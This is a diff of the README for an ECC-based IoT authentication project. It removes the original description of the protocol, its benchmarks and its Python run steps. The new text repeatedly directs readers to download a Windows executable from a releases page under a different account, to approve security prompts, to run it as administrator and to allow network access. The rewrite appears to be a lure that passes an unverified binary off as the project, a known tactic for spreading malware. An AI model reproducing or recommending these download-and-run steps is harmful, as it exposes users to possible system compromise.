@@ -1,260 +1,165 @@
-#  ECC-Based IoT Authentication Protocol
+# 🔐 ECC-IOT-AUTHENTICATION-PROTOCOL - Secure IoT Access Made Simple
 
-A secure and lightweight authentication protocol for IoT environments based on **Elliptic Curve Cryptography (ECC)**.  
-This project implements **mutual authentication, session key establishment, attack resistance, and performance benchmarking**, along with **adaptive trust-based enhancements**.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases)
 
----
+## 📥 Download
+Visit this page to download: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases
 
-# Overview
+## 🧭 What This App Does
 
-IoT devices are highly vulnerable to attacks due to limited resources and insecure communication channels.  
-This project implements a **secure ECC-based authentication protocol** between:
+ECC-IOT-AUTHENTICATION-PROTOCOL is a secure IoT authentication app built around ECC. It helps devices prove who they are before they connect. It also supports session key setup, trust checks, and replay attack protection.
 
-- Sensor (IoT device)
-- Server (Gateway)
-- Trusted Authority (TA)
+This project is meant for users who want a local tool to test or run an IoT security flow on Windows. It follows a clear authentication process and uses time checks and resync steps to keep devices in step.
 
-The protocol ensures:
+## 🖥️ Windows Requirements
 
-- Secure identity verification
-- Session key establishment
-- Resistance to multiple attacks
-- Lightweight computation for IoT systems
+Before you start, make sure your PC has:
 
----
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- An active internet connection for the first download
+- Permission to open downloaded files
 
-#  System Architecture
+If Windows asks for approval when you open the app, choose the option that lets it run.
 
-### 🔹 Trusted Authority (TA)
-- Registers devices
-- Generates cryptographic credentials
-- Distributes authentication tokens
+## 🚀 Getting Started
 
-### 🔹 Sensor (IoT Device)
-- Initiates authentication
-- Generates authentication request
-- Verifies server response
-- Updates authentication tokens
+1. Open the download page: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases
+2. Find the latest release
+3. Download the Windows file from that release
+4. Save the file to your Downloads folder or Desktop
+5. Open the file and follow the on-screen steps
+6. If the app comes in a zip file, extract it first, then open the main program file
 
-### 🔹 Server (Gateway)
-- Verifies sensor identity
-- Generates response
-- Establishes secure session
+## 🪟 How to Install on Windows
 
----
+### 1. Download the release
+Go to the release page and pick the latest version. Download the Windows package from there.
 
-#  Protocol Phases
+### 2. Unpack the files
+If the download is a .zip file:
 
-## 1️⃣ Registration Phase (R1–R4)
+- Right-click the file
+- Choose Extract All
+- Pick a folder you can find again, like Desktop or Downloads
 
-- Sensor and Server register with TA
-- Receive:
-  - Identity (ID)
-  - Private key
-  - Public key
-  - Initial authentication token (TCssp)
-- Compute Trusted Witness:
-WT = k · PK
+### 3. Start the app
+Open the extracted folder and look for the main file. It may be named something like:
 
----
+- `ECC-IOT-AUTHENTICATION-PROTOCOL.exe`
+- `run.bat`
+- `main.py`
 
-## 2️⃣ Authentication Phase (A1–A4)
+If you see an `.exe` file, double-click it to start the app.
 
-### A1 — Sensor Request
-A_s = x_s · PK_s
-ETCssp = TCssp ⊕ h(A_s, WT_s)
-Vs1 = h(ID_s, TCssp, A_s, WT_s)
+### 4. Allow access if asked
+Windows may ask if you want to run the file. Choose Run or Yes if you trust the file source from the release page.
 
-### A2 — Server Verification
-- Recovers TC
-- Verifies integrity and authenticity
+## 🔐 Main Features
 
-### A3 — Server Response
-A_sp = x_sp · PK_sp
-V_sp = h(WT_sp, ID_s, TC_new, A_sp, SSK)
+- Mutual authentication between device and server
+- Session key setup for secure communication
+- Replay attack protection
+- MITM attack resistance
+- Impersonation attack resistance
+- Adaptive trust management
+- Time-based authentication checks
+- Resynchronization support when device timing shifts
+- Performance benchmarking for auth flow testing
 
-### A4 — Sensor Verification
-- Validates server response
-- Establishes session key
+## 🧩 How It Works
 
----
+The app follows a simple security flow:
 
-# 🔑 Session Key Establishment
+1. A device sends its identity
+2. The other side checks that identity
+3. ECC methods help confirm trust
+4. Both sides set a shared session key
+5. Time rules help block stale requests
+6. Trust scores help guide future checks
+7. If timing drifts, the system can resync
 
-Both sides independently compute:
-Sensor: SK = x_s · (k_s · A_sp)
-Server: SK = x_sp · (k_sp · A_s)
+This helps protect the network from fake devices and reused messages.
 
-✔ Due to ECC properties → same shared key
+## 📁 What You May See in the Download
 
----
+The release folder may include:
 
-# 🔄 Token Update Mechanism
-TC_new = TC_old ⊕ h(SK, A_sp)
+- A Windows app file
+- A zip package
+- Support files
+- A short readme file
+- Test or sample data files
 
-✔ Prevents replay attacks  
-✔ Ensures forward secrecy  
+If there is a readme file in the download, open it first for file-specific steps.
 
----
+## 🛠️ Basic Use
 
-# 🔁 Resynchronization Mechanism
+After you start the app:
 
-If token mismatch occurs:
+- Select the device or test mode if shown
+- Enter any required device details
+- Start the authentication flow
+- Wait for the result screen
+- Check the session status or trust result
 
-- Sensor sends recovery request
-- Server restores correct token
-- System resumes without re-registration
+If the app has command-line steps, use the exact values shown in the app folder or release notes.
 
----
+## 🔎 Security Focus
 
-# 🛡️ Security Features
+This project uses common security ideas used in IoT systems:
 
-| Attack | Protection |
-|------|----------|
-| Replay Attack | Dynamic token update |
-| Impersonation | Hash verification |
-| MITM Attack | ECC key agreement |
-| Desynchronization | Resync protocol |
-| Expired Session | Time-bound validation |
+- ECC for compact key work
+- Hash checks for data integrity
+- Time limits to stop old messages
+- Trust rules for better access control
+- Resync logic for devices that fall out of step
 
----
+These parts help keep device access controlled and reduce common network risks.
 
-# 🚀 Novel Enhancements
+## 🧪 Testing and Benchmarking
 
-This implementation extends the original protocol with:
+The repository includes work on performance testing. That means the project can be used to check:
 
-### ✅ Adaptive Trust Score
-- Increases on success
-- Decreases on failure
+- Authentication time
+- Key setup speed
+- Message handling cost
+- Trust update behavior
+- Response under repeated requests
 
-### ✅ Time-Bound Authentication
-- Prevents expired session reuse
+This is useful when you want to compare security strength and system speed.
 
-### ✅ Device Lock Mechanism
-- Blocks compromised devices
+## 🗂️ Folder Guide
 
-### ✅ Trust Decay
-- Reduces trust over inactivity
+If you open the project files, you may see folders such as:
 
----
+- `src` for source files
+- `tests` for test files
+- `docs` for notes and guides
+- `data` for sample input
+- `results` for output or logs
 
-# 📊 Performance Evaluation
+Keep the folder names unchanged unless the release notes say otherwise.
 
-Four configurations tested:
+## ❓ Common Questions
 
-| Mode | Description |
-|------|------------|
-| Original | Base protocol |
-| Original + Attack | Attack overhead |
-| Enhanced | Trust + expiry |
-| Enhanced + Attack | Full system |
+### Do I need programming knowledge?
+No. If the release includes a Windows file, you can usually download and run it from the release page.
 
-### Key Observation:
-> Security enhancements introduce **negligible computational overhead** compared to ECC operations.
+### What if the file does not open?
+Try these steps:
 
----
+- Make sure the download finished
+- Extract the zip file if needed
+- Right-click the file and choose Open
+- Run it as administrator if Windows blocks it
 
-# 📈 Example Output
-===== PERFORMANCE COMPARISON =====
+### What if I see many files?
+Open the folder and look for the main app file. A readme file may also tell you which one to use.
 
-Original → 0.246 sec
-Original + Attack → 0.269 sec
-Enhanced → 0.248 sec
-Enhanced + Attack → 0.261 sec
+### What if the app asks for network access?
+Allow access if you want the authentication flow to work across devices or over a local network.
 
----
-
-# 📊 Performance Graph
-
-The following graph compares execution time across four configurations:
-
-- Original protocol
-- Original with attack simulation
-- Enhanced protocol
-- Enhanced with attack simulation
-
-![Performance Graph](results/performance_graph.png)
-
-### 📌 Analysis
-
-The results show that:
-
-- ECC operations dominate computational cost
-- Additional trust and expiry checks introduce negligible overhead
-- The enhanced protocol significantly improves security with minimal performance impact
-
-This demonstrates that the proposed model is suitable for real-world IoT deployment.
-
----
-
-# 🧪 Attack Simulations
-
-- Replay attack
-- Impersonation attack
-- MITM attack
-- Time expiry attack
-- Desynchronization recovery
-
----
-
-# ⚙️ Installation
-
-```bash
-pip install -r requirements.txt
-▶️ How to Run
-
-Authentication Simulation
-python3 main_test.py
-
-
-Performance Benchmark
-python3 performance_compare.py
-📦 Requirements
-tinyec
-matplotlib
-numpy<2
-ECC-IOT-AUTHENTICATION-PROTOCOL/
-
-│
-├── results
-│          ├── performance_graph.png
-│          └── output.png
-│     
-├── ecc_math.py
-├── ecc_math.py
-├── hash_functions.py
-├── ta.py
-├── sensor.py
-├── server.py
-├── main_test.py
-├── performance_compare.py
-│
-├── requirements.txt
-├── README.md
-└── .gitignore
-
-
-🎯 Key Contributions
-
-Implemented ECC-based IoT authentication protocol
-
-Designed mutual authentication mechanism
-
-Simulated real-world cyber attacks
-
-Developed adaptive trust-based security enhancement
-
-Conducted performance benchmarking
-
-Ensured minimal overhead with improved security
-
-👨‍💻 Author
-
-Vikas Parmar
-M.Tech (Information Technology)
-
-📜 License
-
- This  project is licensed under the MIT License.
-
-
+## 📌 Download Again
+Visit this page to download: https://github.com/Lutefredsanger944/ECC-IOT-AUTHENTICATION-PROTOCOL/releases
